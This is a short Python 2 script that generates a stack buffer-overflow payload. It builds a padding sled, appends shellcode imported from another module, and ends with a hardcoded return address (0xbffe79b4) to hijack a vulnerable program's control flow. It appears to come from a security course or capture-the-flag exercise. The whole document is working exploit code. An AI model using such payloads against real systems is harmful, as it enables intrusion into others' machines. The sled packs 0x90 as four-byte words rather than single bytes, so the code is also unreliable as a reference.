from struct import pack
from shellcode import shellcode

nooplen = 1032 + 4 - len(shellcode)
noop = pack("<I", 0x90)*nooplen
toReturn = 0xbffe79b4
print noop + shellcode + pack("<I", toReturn)
